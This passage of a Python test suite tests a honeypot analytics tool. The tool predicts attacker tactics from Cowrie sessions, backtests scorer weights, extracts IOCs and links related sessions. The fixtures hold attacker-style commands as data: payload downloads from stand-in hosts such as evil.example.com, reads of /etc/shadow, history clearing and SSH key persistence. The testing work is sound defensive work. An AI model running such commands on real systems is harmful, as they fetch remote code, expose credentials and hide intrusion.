            "min_prefix_transition_count": 1,
            "min_tactic_transition_count": 1,
            "smoothing": 0.0,
        },
        "maturity": {"cold_confidence_cap": ""},
    }
    model = build_actor_fingerprint_transition_model(
        [
            {
                "session_id": "actor-fp-history-no-match",
                "src_ip": "203.0.113.11",
                "hassh": "known-tooling",
                "is_ended": True,
                "classification_events": [
                    {"ttp": "T1033", "tactic": "discovery"},
                    {"ttp": "T1003", "tactic": "credential-access"},
                ],
            }
        ],
        policy=policy,
    )
    features = build_session_features(
        {
            "session_id": "actor-fp-no-match",
            "src_ip": "198.51.100.12",
            "hassh": "different-tooling",
            "classification_events": [{"ttp": "T1033", "tactic": "discovery", "confidence": 1.0}],
        }
    )
    snapshot = RealtimePredictionEngine(
        policy,
        actor_fingerprint_transition_model=model,
    ).predict(features, event_id="evt-actor-fp-no-match")
    assert snapshot["scorer_outputs"]["actor_fingerprint_transition"] == []
    assert "actor_fingerprint_transition" not in snapshot["active_scorers"]
    assert snapshot["final_ranking"] == []


def test_external_seed_health_summarizes_quality_and_validation() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        model_path = Path(tmp) / "external_model.json"
        validation_path = Path(tmp) / "external_validation.json"
        review_path = Path(tmp) / "external_review.json"
        health_path = Path(tmp) / "external_health.json"
        model_path.write_text(
            json.dumps(
                {
                    "schema_version": "external_transition_model.v1",
                    "model_id": "externaltransition-test",
                    "built_at": "2026-05-22T00:00:00Z",
                    "source_type": "external_cowrie_seed",
                    "dataset_handle": "unit-test/cowrie",
                    "usable_sessions": 3,
                    "transition_count": 2,
                    "prefix_transition_count": 1,
                    "technique_transition_count": 2,
                    "classification_quality": {
                        "raw_command_events": 10,
                        "accepted_command_events": 4,
                        "accepted_classification_events": 5,
                        "acceptance_rate": 0.4,
                        "low_confidence_commands_skipped": 5,
                        "low_confidence_rate": 0.5,
                        "noise_commands_skipped": 1,
                        "source_counts": {"rule": 4, "securebert": 1},
                        "securebert_invocations": 2,
                    },
                    "provenance": {"securebert_used": True, "classifier": "test classifier"},
                }
            ),
            encoding="utf-8",
        )
        validation_path.write_text(
            json.dumps(
                {
                    "schema_version": "external_seed_validation.v1",
                    "generated_at": "2026-05-22T00:01:00Z",
                    "completed_sessions": 3,
                    "evaluated_sessions": 2,
                    "metrics": {
                        "total_cases": 4,
                        "predicted_cases": 4,
                        "coverage": 1.0,
                        "top1_accuracy": 0.75,
                        "top3_accuracy": 1.0,
                        "mean_reciprocal_rank": 0.83,
                    },
                    "accuracy_by_tactic": {"execution": {"cases": 2, "top1_accuracy": 0.5, "top3_accuracy": 1.0}},
                }
            ),
            encoding="utf-8",
        )
        review_path.write_text(
            json.dumps(
                {
                    "schema_version": "external_seed_review_queue.v1",
                    "review_count": 2,
                    "review_records": [
                        {"reason": "low_confidence", "command": "cat /etc/*release* | grep centos"},
                        {"reason": "low_confidence", "command": "cat /etc/*release* | grep centos"},
                    ],
                }
            ),
            encoding="utf-8",
        )
        health = build_external_seed_health(
            model_path=str(model_path),
            validation_path=str(validation_path),
            review_path=str(review_path),
        )
        assert health["schema_version"] == "external_seed_health.v1"
        assert health["model"]["securebert_used"] is True
        assert health["classification_quality"]["unused_command_events"] == 6
        assert health["validation"]["top3_accuracy"] == 1.0
        assert health["review_queue"]["reason_counts"]["low_confidence"] == 2
        health_path.write_text(json.dumps(health), encoding="utf-8")
        loaded = load_external_seed_health(str(health_path))
        assert loaded["model"]["model_id"] == "externaltransition-test"


def test_external_seed_builder_uses_securebert_rules_and_quality_filters() -> None:
    class FakeMitre:
        def get_tactics(self, tid):
            return {
                "T1033": ["discovery"],
                "T1082": ["discovery"],
                "T1059": ["execution"],
                "T1105": ["command-and-control"],
            }.get(tid, [])

        def get_name(self, tid):
            return tid

    def fake_bert(command: str):
        if command == "whoami":
            return "T1033", 0.98
        if command == "uname -a":
            return "T1059", 0.96
        if command == "customimplant --stage":
            return "T1105", 0.94
        if command == "weirdlow":
            return "T1059", 0.40
        return None, 0.0

    with tempfile.TemporaryDirectory() as tmp:
        input_path = Path(tmp) / "seed.ndjson"
        output_path = Path(tmp) / "model.json"
        session_output = Path(tmp) / "sessions.json"
        review_output = Path(tmp) / "review.json"
        events = [
            {"session": "seed-hybrid-1", "eventid": "cowrie.command.input", "input": "whoami"},
            {"session": "seed-hybrid-1", "eventid": "cowrie.command.input", "input": "customimplant --stage"},
            {"session": "seed-hybrid-1", "eventid": "cowrie.session.closed"},
            {"session": "seed-hybrid-2", "eventid": "cowrie.command.input", "input": "uname -a"},
            {"session": "seed-hybrid-2", "eventid": "cowrie.command.input", "input": "weirdlow"},
            {"session": "seed-hybrid-2", "eventid": "cowrie.command.input", "input": "exit"},
            {"session": "seed-hybrid-2", "eventid": "cowrie.session.closed"},
        ]
        input_path.write_text("\n".join(json.dumps(event) for event in events), encoding="utf-8")

        model = build_external_seed_model(
            input_root=str(input_path),
            output_path=str(output_path),
            use_securebert=True,
            bert_fn=fake_bert,
            mitre_db=FakeMitre(),
            min_label_confidence=0.90,
            session_output_path=str(session_output),
            review_output_path=str(review_output),
        )

        quality = model["classification_quality"]
        assert quality["accepted_command_events"] == 2
        assert quality["source_counts"]["both_agree"] == 1
        assert quality["source_counts"]["securebert"] == 1
        assert quality["source_counts"]["both_disagree"] == 1
        assert quality["disagreement_commands_skipped"] == 1
        assert quality["low_confidence_commands_skipped"] == 1
        assert quality["noise_commands_skipped"] == 1
        assert model["provenance"]["securebert_used"] is True
        assert model["transition_count"] >= 1

        sessions_doc = json.loads(session_output.read_text(encoding="utf-8"))
        assert sessions_doc["schema_version"] == "external_seed_sessions.v1"
        accepted_events = sessions_doc["sessions"][0]["classification_events"]
        assert accepted_events[0]["external_seed_validation"]["validation_source"] == "auto_rule_securebert_consensus"
        review_doc = json.loads(review_output.read_text(encoding="utf-8"))
        review_reasons = {item["reason"] for item in review_doc["review_records"]}
        assert {"classifier_disagreement", "low_confidence", "shell_noise"}.issubset(review_reasons)


def test_external_seed_builder_accepts_rule_securebert_tactic_agreement() -> None:
    class FakeMitre:
        def get_tactics(self, tid):
            return {
                "T1033": ["discovery"],
                "T1070": ["defense-evasion"],
                "T1562": ["defense-evasion"],
            }.get(tid, [])

        def get_name(self, tid):
            return tid

    def fake_bert(command: str):
        if command == "whoami":
            return "T1033", 0.98
        if command == "history -c":
            return "T1562", 0.96
        return None, 0.0

    with tempfile.TemporaryDirectory() as tmp:
        input_path = Path(tmp) / "seed.ndjson"
        output_path = Path(tmp) / "model.json"
        review_output = Path(tmp) / "review.json"
        events = [
            {"session": "seed-tactic-agree", "eventid": "cowrie.command.input", "input": "whoami"},
            {"session": "seed-tactic-agree", "eventid": "cowrie.command.input", "input": "history -c"},
            {"session": "seed-tactic-agree", "eventid": "cowrie.session.closed"},
        ]
        input_path.write_text("\n".join(json.dumps(event) for event in events), encoding="utf-8")

        model = build_external_seed_model(
            input_root=str(input_path),
            output_path=str(output_path),
            use_securebert=True,
            bert_fn=fake_bert,
            mitre_db=FakeMitre(),
            min_label_confidence=0.90,
            review_output_path=str(review_output),
        )

        quality = model["classification_quality"]
        assert quality["source_counts"]["both_agree"] == 1
        assert quality["source_counts"]["both_tactic_disagree"] == 1
        assert quality["disagreement_commands_skipped"] == 1
        assert quality["accepted_command_events"] == 1
        review_doc = json.loads(review_output.read_text(encoding="utf-8"))
        review_reasons = {item["reason"] for item in review_doc["review_records"]}
        assert "classifier_disagreement" in review_reasons


def test_primary_transition_chronological_evaluation_compares_current_architecture_and_baselines() -> None:
    payloads = []
    for index in range(20):
        payloads.append(
            {
                "session_id": f"chronological-{index:02d}",
                "start_time": f"2026-01-{index + 1:02d}T00:00:00Z",
                "status": "closed",
                "is_ended": True,
                "classification_events": [
                    {
                        "command": "whoami",
                        "ttp": "T1033",
                        "tactic": "discovery",
                        "source": "rule",
                        "confidence": 1.0,
                    },
                    {
                        "command": "sh /tmp/a",
                        "ttp": "T1059",
                        "tactic": "execution",
                        "source": "rule",
                        "confidence": 1.0,
                    },
                ],
            }
        )
    policy = json.loads(Path("configs/prediction_policy.trusted.json").read_text())["policy"]
    policy["min_sessions_for_local"] = 1
    policy["min_transition_count"] = 1
    policy["min_prefix_transition_count"] = 1
    policy["min_technique_transition_count"] = 1
    policy["min_tactic_transition_count"] = 1
    result = evaluate_primary_transition(payloads, policy, build_transition_model([]))

    assert result["split_sizes"] == {"train": 14, "calibration": 3, "test": 3}
    assert "not independent human ground truth" in result["label_origin"]
    assert result["data_sufficiency"]["status"] == "insufficient_data"
    assert result["data_sufficiency"]["evaluated_examples"] == 3
    assert result["data_sufficiency"]["metrics_are_descriptive_only"] is True
    assert result["production_policy_changed"] is False
    assert set(result["results"]) == {
        "current_primary_transition_with_fallback",
        "local_transition_only",
        "external_transition_only",
        "fallback_progression_only",
        "weighted_ensemble_baseline",
        "global_majority_baseline",
        "last_tactic_majority_baseline",
    }
    current = result["results"]["current_primary_transition_with_fallback"]["metrics"]
    assert current["evaluated_examples"] == 3
    assert current["top1_accuracy"] == 1.0
    assert current["selected_source_counts"] == {"local_transition": 3}
    assert current["fallback_use_rate"] == 0.0
    assert current["abstention_rate"] == 0.0
    assert current["performance_by_support_level"] == {
        "transition_support_5_plus": {
            "evaluated_examples": 3,
            "coverage": 1.0,
            "top1_accuracy": 1.0,
            "top3_accuracy": 1.0,
        }
    }
    assert current["bootstrap_95ci"]["top1_accuracy"] == [1.0, 1.0]


def test_prediction_backtest_scores_next_tactic_accuracy() -> None:
    history = [
        {
            "session_id": "bt-1",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "whoami"},
                {"tactic": "credential-access", "command": "cat /etc/passwd CVE-2024-12345"},
                {"tactic": "command-and-control", "command": "wget http://example/a.sh"},
            ],
        },
        {
            "session_id": "bt-2",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "id"},
                {"tactic": "credential-access", "command": "cat /etc/shadow"},
                {"tactic": "command-and-control", "command": "curl http://example/b.sh"},
            ],
        },
        {
            "session_id": "bt-3",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "uname -a"},
                {"tactic": "credential-access", "command": "cat /etc/passwd"},
                {"tactic": "persistence", "command": "echo ssh-rsa AAA >> ~/.ssh/authorized_keys"},
            ],
        },
    ]
    result = backtest_sessions(
        history,
        policy={
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_prefix_transition_count": 1,
            "min_technique_transition_count": 1,
            "min_tactic_transition_count": 1,
            "weights": {
                "local_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.2,
            },
        },
        include_cases=True,
    )
    assert result["schema_version"] == "prediction_backtest.v1"
    assert result["evaluated_sessions"] == 3
    assert result["metrics"]["total_cases"] == 6
    assert result["metrics"]["coverage"] == 1.0
    assert result["metrics"]["top1_accuracy"] == 0.8333
    assert result["metrics"]["brier_score"] >= 0.0
    assert "accuracy_by_tactic" in result
    assert result["accuracy_by_tactic"]["credential-access"]["top1_accuracy"] == 1.0
    assert "brier_score" in result["accuracy_by_tactic"]["credential-access"]
    assert "accuracy_by_scorer_source" in result
    assert result["scorer_disagreement"]["rate"] >= 0.0
    assert "confidence_label_calibration" in result
    assert "calibration" in result
    assert "scorer_level_report" in result
    assert "local_transition" in result["scorer_level_report"]["accuracy_per_scorer"]
    proposal = result["scorer_level_report"]["weight_adjustment_proposal"]
    assert proposal["apply_automatically"] is False
    assert "vulnerability_risk" not in proposal["proposed_weights_bounded"]
    assert "vulnerability_risk" in proposal["excluded_scorers"]
    assert result["cases"][0]["actual_next"] == "credential-access"
    assert "brier_score" in result["cases"][0]
    assert result["cases"][0]["evidence_origin"] == "live_cowrie"
    assert "scorer_correctness" in result["cases"][0]
    assert "final_contributors" in result["cases"][0]
    assert "trust_status" in result["cases"][0]
    assert result["metrics_by_evidence_origin"]["live_cowrie"]["cases"] == 6
    assert result["metrics_by_evidence_origin"]["controlled_test"]["cases"] == 0


def test_prediction_backtest_reports_baseline_and_ablation_modes() -> None:
    history = [
        {
            "session_id": "bt-compare-1",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "whoami"},
                {"tactic": "credential-access", "command": "cat /etc/passwd"},
                {"tactic": "command-and-control", "command": "wget http://example/a.sh"},
            ],
        },
        {
            "session_id": "bt-compare-2",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "id"},
                {"tactic": "credential-access", "command": "cat /etc/shadow"},
                {"tactic": "command-and-control", "command": "curl http://example/b.sh"},
            ],
        },
        {
            "session_id": "bt-compare-3",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "uname -a"},
                {"tactic": "execution", "command": "sh ./setup.sh"},
            ],
        },
    ]
    result = backtest_sessions(
        history,
        policy={
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_prefix_transition_count": 1,
            "min_technique_transition_count": 1,
            "min_tactic_transition_count": 1,
            "weights": {
                "local_transition": 0.7,
                "fallback_progression": 0.3,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
            },
        },
        include_comparisons=True,
        ablation_scorers=["fallback_progression"],
    )
    comparisons = result["evaluation_comparisons"]
    assert comparisons["schema_version"] == "prediction_evaluation_comparisons.v1"
    baseline = comparisons["baseline"]["local_transition_only"]
    assert baseline["metrics"]["total_cases"] == result["metrics"]["total_cases"]
    assert "brier_score" in baseline["metrics"]
    ablation = comparisons["ablation"]["fallback_progression"]
    assert ablation["disabled_scorer"] == "fallback_progression"
    assert ablation["metrics"]["total_cases"] == result["metrics"]["total_cases"]
    assert "top1_accuracy" in ablation["delta_vs_primary"]
    assert "brier_score" in ablation["delta_vs_primary"]
    enrichment_modes = comparisons["enrichment_context_modes"]
    assert set(enrichment_modes) == {"excluded", "scorer", "score_multiplier"}
    assert enrichment_modes["excluded"]["label"] == "enrichment_context_excluded"
    assert enrichment_modes["score_multiplier"]["metrics"]["total_cases"] == result["metrics"]["total_cases"]
    assert "brier_score" in enrichment_modes["scorer"]["delta_vs_primary"]
    decay_methods = comparisons["external_seed_decay_methods"]
    assert set(decay_methods) == {"maturity_multiplier", "empirical_shrinkage"}
    assert decay_methods["empirical_shrinkage"]["label"] == "external_seed_decay_empirical_shrinkage"
    assert decay_methods["maturity_multiplier"]["metrics"]["total_cases"] == result["metrics"]["total_cases"]
    actor_prior = comparisons["actor_fingerprint_prior"]
    assert set(actor_prior) == {"disabled", "enabled"}
    assert actor_prior["enabled"]["label"] == "actor_fingerprint_prior_enabled"
    assert actor_prior["enabled"]["metrics"]["total_cases"] == result["metrics"]["total_cases"]
    assert "brier_score" in actor_prior["enabled"]["delta_vs_primary"]
    shrinkage_sweep = comparisons["external_seed_shrinkage_k_sweep"]
    assert shrinkage_sweep["schema_version"] == "external_seed_shrinkage_k_sweep.v1"
    assert len(shrinkage_sweep["results"]) == 16
    assert shrinkage_sweep["proposal"]["apply_automatically"] is False


def test_external_seed_shrinkage_grid_search_marks_empty_metrics_missing() -> None:
    result = evaluate_external_seed_shrinkage_grid(
        [],
        policy={
            "external_seed_weight_decay": {
                "enabled": True,
                "method": "empirical_shrinkage",
                "shrinkage_count_source": "transitions",
                "shrinkage_k": 200.0,
            }
        },
    )
    assert result["status"] == "insufficient_data"
    assert result["proposal"]["status"] == "insufficient_data"
    assert result["proposal"]["apply_automatically"] is False
    assert result["best_candidate"] == {}
    assert result["split"]["heldout_sessions"] == 0
    metric_fields = [
        "brier_score",
        "top_k_accuracy",
        "top1_accuracy",
        "delta_brier_vs_default_k",
        "delta_brier_vs_legacy_maturity",
    ]
    for row in result["results"]:
        for field in metric_fields:
            assert row[field] is None
        assert row["bootstrap_brier"]["mean"] is None
        assert row["bootstrap_brier"]["std"] is None
        assert row["bootstrap_brier"]["ci95"] is None
    for baseline in result["baselines"].values():
        metrics = baseline["metrics"]
        assert metrics["brier_score"] is None
        assert metrics["top3_accuracy"] is None
        assert metrics["top1_accuracy"] is None
    assert result["stability"]["best_vs_runner_up_brier_delta"] is None
    assert result["stability"]["bootstrap_expected_noise"] is None


def test_external_seed_shrinkage_grid_search_selects_lowest_brier_fixture() -> None:
    local_history = [
        {
            "session_id": f"local-shrink-grid-{index}",
            "is_ended": True,
            "classification_events": [
                {"tactic": "initial-access"},
                {"tactic": "execution"},
                {"tactic": "discovery"},
                {"tactic": "credential-access"},
            ],
        }
        for index in range(12)
    ]
    external_history = [
        {
            "session_id": f"external-shrink-grid-{index}",
            "is_ended": True,
            "classification_events": [
                {"tactic": "initial-access"},
                {"tactic": "command-and-control"},
            ],
        }
        for index in range(12)
    ]
    with tempfile.TemporaryDirectory() as tmp:
        external_model_path = Path(tmp) / "external_seed_model.json"
        external_model_path.write_text(
            json.dumps(
                {
                    "model": build_transition_model(
                        external_history,
                        source_name="external_seed_transition",
                    )
                }
            ),
            encoding="utf-8",
        )
        result = evaluate_external_seed_shrinkage_grid(
            local_history,
            policy={
                "prediction_mode": "weighted_ensemble_baseline",
                "external_transition_model_path": str(external_model_path),
                "min_sessions_for_local": 1,
                "min_transition_count": 1,
                "min_prefix_transition_count": 1,
                "min_technique_transition_count": 1,
                "min_tactic_transition_count": 1,
                "external_min_sessions": 1,
                "external_min_transition_count": 1,
                "external_min_prefix_transition_count": 1,
                "external_min_technique_transition_count": 1,
                "external_min_tactic_transition_count": 1,
                "min_active_scorers": 1,
                "weights": {
                    "local_transition": 1.0,
                    "external_seed_transition": 1.0,
                    "fallback_progression": 0.0,
                    "tactic_combination": 0.0,
                    "mitre_association": 0.0,
                    "sigma_correlation": 0.0,
                    "enrichment_context": 0.0,
                    "vulnerability_risk": 0.0,
                },
                "external_seed_weight_decay": {
                    "enabled": True,
                    "method": "empirical_shrinkage",
                    "cold": 1.0,
                    "warming": 0.5,
                    "stable": 0.2,
                    "shrinkage_count_source": "transitions",
                    "shrinkage_k": 200.0,
                    "min_multiplier": 0.0,
                    "max_multiplier": 1.0,
                },
                "maturity": {
                    "stable": {"min_usable_sessions": 1, "min_transition_count": 1},
                    "warming": {"min_usable_sessions": 1, "min_transition_count": 1},
                    "cold_confidence_cap": "",
                    "warming_confidence_cap": "",
                },
            },
            bootstrap_iterations=20,
            min_heldout_sessions=1,
        )

    best = result["best_candidate"]
    assert result["status"] == "proposal_only"
    assert best["k"] == 10
    assert best["count_source"] == "transitions"
    assert result["proposal"]["apply_automatically"] is False
    overlay = result["proposal"]["policy_overlay"]["external_seed_weight_decay"]
    assert overlay["shrinkage_k"] == 10
    assert overlay["shrinkage_count_source"] == "transitions"
    grid = {
        (row["count_source"], row["k"]): row
        for row in result["results"]
    }
    assert grid[("transitions", 10)]["brier_score"] < grid[("sessions", 10)]["brier_score"]
    assert grid[("transitions", 10)]["brier_score"] < grid[("transitions", 200)]["brier_score"]
    for row in result["results"]:
        assert isinstance(row["brier_score"], float)
        assert isinstance(row["top_k_accuracy"], float)
        assert isinstance(row["delta_brier_vs_default_k"], float)
        assert isinstance(row["delta_brier_vs_legacy_maturity"], float)
    for baseline in result["baselines"].values():
        assert isinstance(baseline["metrics"]["brier_score"], float)
        assert isinstance(baseline["metrics"]["top3_accuracy"], float)


def test_empirical_weight_fit_excludes_context_and_risk_by_default() -> None:
    cases = [
        {
            "actual_next": "credential-access",
            "scorer_outputs": {
                "local_transition": [
                    {"tactic": "credential-access", "score": 0.9, "source_type": "empirical_local"}
                ],
                "fallback_progression": [
                    {"tactic": "execution", "score": 0.8, "source_type": "heuristic_prior"}
                ],
                "enrichment_context": [
                    {"tactic": "execution", "score": 1.0, "source_type": "context_modifier"}
                ],
                "vulnerability_risk": [
                    {"tactic": "execution", "score": 1.0, "source_type": "risk_modifier"}
                ],
            },
        },
        {
            "actual_next": "credential-access",
            "scorer_outputs": {
                "local_transition": [
                    {"tactic": "credential-access", "score": 0.85, "source_type": "empirical_local"}
                ],
                "fallback_progression": [
                    {"tactic": "command-and-control", "score": 0.7, "source_type": "heuristic_prior"}
                ],
                "enrichment_context": [
                    {"tactic": "command-and-control", "score": 1.0, "source_type": "context_modifier"}
                ],
            },
        },
        {
            "actual_next": "execution",
            "scorer_outputs": {
                "local_transition": [
                    {"tactic": "credential-access", "score": 0.65, "source_type": "empirical_local"}
                ],
                "fallback_progression": [
                    {"tactic": "execution", "score": 0.95, "source_type": "heuristic_prior"}
                ],
            },
        },
    ]
    result = fit_weights_from_cases(
        cases,
        {
            "local_transition": 0.34,
            "fallback_progression": 0.33,
            "enrichment_context": 0.22,
            "vulnerability_risk": 0.11,
        },
    )
    assert result["schema_version"] == "prediction_weight_fit.v1"
    assert result["status"] == "fit_completed"
    assert result["apply_automatically"] is False
    assert "enrichment_context" not in result["scorers"]
    assert "vulnerability_risk" not in result["scorers"]
    assert result["constraints"]["non_negative"] is True
    assert result["constraints"]["sum_to_one_within_fitted_voter_set"] is True
    fitted = result["fitted_weights"]
    assert all(weight >= 0.0 for weight in fitted.values())
    assert abs(sum(fitted.values()) - 1.0) < 0.0001
    assert result["loss_fitted"] <= result["loss_current"]
    assert result["policy_overlay"]["weights"] == fitted


def test_prediction_backtest_reports_proposal_only_empirical_weight_fit() -> None:
    history = [
        {
            "session_id": "bt-fit-1",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "whoami"},
                {"tactic": "credential-access", "command": "cat /etc/passwd"},
                {"tactic": "command-and-control", "command": "wget http://example/a.sh"},
            ],
        },
        {
            "session_id": "bt-fit-2",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "id"},
                {"tactic": "credential-access", "command": "cat /etc/shadow"},
                {"tactic": "command-and-control", "command": "curl http://example/b.sh"},
            ],
        },
        {
            "session_id": "bt-fit-3",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "uname -a"},
                {"tactic": "execution", "command": "sh ./setup.sh"},
            ],
        },
    ]
    policy = {
        "min_sessions_for_local": 1,
        "min_transition_count": 1,
        "min_prefix_transition_count": 1,
        "min_technique_transition_count": 1,
        "min_tactic_transition_count": 1,
        "weights": {
            "local_transition": 0.7,
            "fallback_progression": 0.3,
            "tactic_combination": 0.0,
            "mitre_association": 0.0,
            "sigma_correlation": 0.0,
            "enrichment_context": 0.0,
        },
    }
    result = backtest_sessions(
        history,
        policy=policy,
        fit_weights=True,
    )
    fit = result["empirical_weight_fit"]
    assert "cases" not in result
    assert fit["schema_version"] == "prediction_weight_fit.v1"
    assert fit["status"] == "fit_completed"
    assert fit["case_count"] == result["metrics"]["total_cases"]
    assert fit["apply_automatically"] is False
    assert fit["loss_fitted"] <= fit["loss_current"]
    assert set(fit["fitted_weights"]) == {"fallback_progression", "local_transition"}
    assert abs(sum(fit["fitted_weights"].values()) - 1.0) < 0.0001
    assert fit["policy_overlay"]["weight_fitting"]["apply_automatically"] is False


def test_prediction_backtest_splits_live_and_controlled_metrics() -> None:
    history = [
        {
            "session_id": "bt-origin-live-1",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "whoami"},
                {"tactic": "credential-access", "command": "cat /etc/passwd"},
            ],
        },
        {
            "session_id": "sme-auto-evidence-seed-origin-1",
            "controlled_seed": True,
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "command": "id"},
                {"tactic": "command-and-control", "command": "curl http://example/p.sh"},
            ],
        },
    ]
    result = backtest_sessions(
        history,
        policy={
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_prefix_transition_count": 1,
            "min_technique_transition_count": 1,
            "min_tactic_transition_count": 1,
            "weights": {
                "local_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "enrichment_context": 0.0,
            },
        },
        include_cases=True,
    )
    assert result["metrics"]["total_cases"] == 2
    assert result["metrics_by_evidence_origin"]["live_cowrie"]["cases"] == 1
    assert result["metrics_by_evidence_origin"]["controlled_test"]["cases"] == 1
    origins = {case["session_id"]: case["evidence_origin"] for case in result["cases"]}
    assert origins["bt-origin-live-1"] == "live_cowrie"
    assert origins["sme-auto-evidence-seed-origin-1"] == "controlled_test"


def test_prediction_backtest_loads_external_seed_model() -> None:
    local_history = [
        {
            "session_id": "bt-ext-local-1",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "ttp": "T1033", "command": "whoami"},
                {"tactic": "credential-access", "ttp": "T1003", "command": "cat /etc/passwd"},
            ],
        },
        {
            "session_id": "bt-ext-local-2",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "ttp": "T1033", "command": "id"},
                {"tactic": "credential-access", "ttp": "T1003", "command": "cat /etc/shadow"},
            ],
        },
    ]
    external_history = [
        {
            "session_id": "bt-ext-seed-1",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery", "ttp": "T1033", "command": "whoami"},
                {"tactic": "credential-access", "ttp": "T1003", "command": "cat /etc/passwd"},
            ],
        }
    ]
    with tempfile.TemporaryDirectory() as tmp:
        model_path = Path(tmp) / "external_model.json"
        external_model = build_transition_model(
            external_history,
            source_name="external_seed_transition",
        )
        external_model["source_type"] = "external_cowrie_seed"
        model_path.write_text(json.dumps({"model": external_model}), encoding="utf-8")
        policy = {
            "external_transition_model_path": str(model_path),
            "external_min_sessions": 1,
            "external_min_transition_count": 1,
            "external_min_prefix_transition_count": 1,
            "external_min_technique_transition_count": 1,
            "external_min_tactic_transition_count": 1,
            "min_sessions_for_local": 999,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        }
        assert load_external_transition_model(policy)["source_name"] == "external_seed_transition"
        result = backtest_sessions(local_history, policy=policy, include_cases=True)

    assert result["metrics"]["total_cases"] == 2
    assert "external_seed_transition" in result["accuracy_by_scorer_source"]
    assert result["accuracy_by_scorer_source"]["external_seed_transition"]["cases"] == 2
    assert result["cases"][0]["top_sources"][0]["sources"][0]["name"] == "external_seed_transition"


def test_ioc_extraction_matches_notebook_honeypot_behavior() -> None:
    bundle = extract_iocs_honeypot(
        "curl http://evil.example.com:4444/dropper.sh && echo a" + "b" * 63,
        first_seen="2026-05-12T00:00:00Z",
        force_high=True,
    )
    assert bundle.urls[0].confidence == "high"
    assert bundle.urls[0].honeypot is True
    assert "evil.example.com" in bundle.summary()["URLs"][0]
    assert bundle.hashes[0].type == "sha256"


def test_runtime_context_builds_bpg_and_ioc_summary() -> None:
    payload = {
        "session_id": "sess-ctx",
        "src_ip": "198.51.100.9",
        "raw_events": [
            {
                "eventid": "cowrie.command.input",
                "session": "sess-ctx",
                "src_ip": "198.51.100.9",
                "timestamp": "2026-05-12T00:00:00Z",
                "input": "wget http://malicious.example.com/payload.sh",
                "success": 1,
            }
        ],
    }
    attach_runtime_context_to_payload(payload)
    assert payload["process_tree_status"]["status"] == "built"
    assert payload["bpg_list"][0]["depth"] == 1
    assert payload["ioc_summary"]["total"] >= 1


def test_observable_sighting_extraction_records_ip_url_domain_and_hash() -> None:
    event = {
        "eventid": "cowrie.command.input",
        "session": "obs-1",
        "sensor": "unit-sensor",
        "src_ip": "10.0.0.42",
        "timestamp": "2026-05-12T00:00:00Z",
        "input": "wget http://evil.example.com/payload.sh && echo "
        + "a" * 64,
    }
    sightings = extract_event_observable_sightings(event, event_id="evt-obs", sensor_id="unit-sensor")
    markers = {(item["observable_type"], item["observable_value"], item["role"]) for item in sightings}
    assert ("ip", "10.0.0.42", "source_ip") in markers
    assert ("url", "http://evil.example.com/payload.sh", "command_url") in markers
    assert ("domain", "evil.example.com", "command_domain") in markers
    assert ("hash", "a" * 64, "command_hash") in markers


def test_threat_hunt_worker_links_related_sessions_and_alerts_active_match() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        source_payload = {
            "session_id": "source-closed",
            "src_ip": "8.8.8.8",
            "sensor": "unit-sensor",
            "is_ended": True,
            "commands": ["wget http://evil.example.com/payload.sh"],
            "tactics": ["command-and-control"],
            "ioc_summary": {
                "urls": [{"value": "http://evil.example.com/payload.sh"}],
                "domains": [{"value": "evil.example.com"}],
            },
        }
        active_payload = {
            "session_id": "related-active",
            "src_ip": "9.9.9.9",
            "sensor": "unit-sensor",
            "is_ended": False,
            "commands": ["curl http://evil.example.com/payload.sh"],
        }
        storage.save_session(source_payload)
        storage.save_session(active_payload)
        storage.record_observable_sighting(
            {
                "observable_type": "url",
                "observable_value": "http://evil.example.com/payload.sh",
                "session_id": "source-closed",
                "sensor_id": "unit-sensor",
                "src_ip": "8.8.8.8",
                "role": "ioc_url",
                "source": "unit",
                "eventid": "session_close",
                "payload": {"metadata": {"domain": "evil.example.com"}},
            }
        )
        storage.record_observable_sighting(
            {
                "observable_type": "url",
                "observable_value": "http://evil.example.com/payload.sh",
                "session_id": "related-active",
                "sensor_id": "unit-sensor",
                "src_ip": "9.9.9.9",
                "role": "command_url",
                "source": "unit",
                "eventid": "cowrie.command.input",
                "payload": {"metadata": {"domain": "evil.example.com"}},
            }
        )
        storage.enqueue_threat_hunt_job(
            "source-closed",
            "url",
            "http://evil.example.com/payload.sh",
            trigger_reason="unit-test",
        )

        worker = ThreatHuntWorker(cfg)
        assert worker.process_once() == 1

        links = storage.list_rows("session_links")
        assert len(links) == 1
        assert links[0]["session_id_a"] == "source-closed"
        assert links[0]["session_id_b"] == "related-active"
        assert links[0]["observable_type"] == "url"
        alerts = storage.list_rows("alerts")
        assert len(alerts) == 1
        alert_payload = json.loads(alerts[0]["payload_json"])
        assert alert_payload["alert_type"] == "threat_hunt_match"
        assert alert_payload["session_id"] == "related-active"
